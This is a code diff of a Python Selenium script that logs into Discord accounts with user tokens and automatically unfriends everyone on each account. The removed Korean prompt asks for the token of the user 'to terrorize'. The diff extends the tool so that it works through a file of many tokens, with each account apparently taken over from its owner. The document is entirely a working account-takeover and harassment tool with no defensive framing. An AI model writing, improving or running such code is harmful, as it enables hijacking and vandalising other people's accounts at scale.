@@ -7,12 +7,11 @@ from selenium.common.exceptions import TimeoutException
 import time
 
 
-def account_bomber():
-    token = input(f"\n[\x1b[95m>\x1b[95m\x1B[37m] 테러할 유저 토큰 입력: ")
+def unfriend_all(token: str):
     options = Options()
-    # headless 오류 때문에 수정 필요
     options.headless = True
-
+    options.add_argument("--start-maximized")  # add
+    options.add_argument("--window-size=1920,1080")  # add
     driver = webdriver.Chrome(options=options)
 
     driver.get(url="https://discord.com/app")
@@ -30,7 +29,6 @@ def account_bomber():
     """
     driver.implicitly_wait(5)
     driver.execute_script(script=script)
-    driver.set_window_size(1920, 1080)
 
     show_all_friend_nav = WebDriverWait(driver, 10).until(
         EC.presence_of_element_located((By.CSS_SELECTOR, "div.tabBar-ra-EuL.topPill-3DJJNV :nth-child(2)")))
@@ -42,17 +40,21 @@ def account_bomber():
     except TimeoutException:
         return
 
-
-    print(driver.page_source)
     for extra_button in extra_buttons:
         extra_button.click()
-        driver.implicitly_wait(5)
-        driver.find_elements(By.CSS_SELECTOR, "div.label-2gNW3x")[2].click()
-        driver.implicitly_wait(5)
-        driver.find_element(By.CSS_SELECTOR, ".lookFilled-yCfaCM > div.contents-3ca1mk").click()
+        WebDriverWait(driver, 10).until(
+            EC.presence_of_all_elements_located((By.CSS_SELECTOR, "div.label-2gNW3x")))[1].click()
+        WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.CSS_SELECTOR, ".lookFilled-yCfaCM > div.contents-3ca1mk"))).click()
 
-    time.sleep(10)
+    time.sleep(5)
     driver.quit()
 
 
-account_bomber()
+def accounts_bomber():
+    with open("token.txt", "r", encoding="utf-8") as f:
+        for line in f.readlines():
+            if line.startswith("#"):
+                continue
+            print(line)
+            unfriend_all(line)
